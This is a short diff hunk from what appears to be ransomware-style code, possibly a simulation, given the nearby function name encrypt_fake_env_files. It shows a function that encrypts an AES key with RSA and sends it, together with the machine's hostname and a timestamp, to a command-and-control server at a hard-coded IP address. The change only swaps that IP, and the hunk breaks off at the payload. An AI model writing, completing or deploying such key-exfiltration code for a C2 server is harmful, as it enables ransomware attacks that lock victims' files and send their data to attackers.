@@ -90,7 +90,7 @@ def encrypt_fake_env_files():
 def send_aes_key_to_c2(key):
     public_key = load_rsa_public_key()
     encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
-    c2_url = "http://15.188.77.17:8999"
+    c2_url = "http://35.180.193.162:8999"
     hostname = socket.gethostname()  # Get computer name
     timestamp = datetime.datetime.now().isoformat()  # Get current timestamp in ISO format
     payload = {
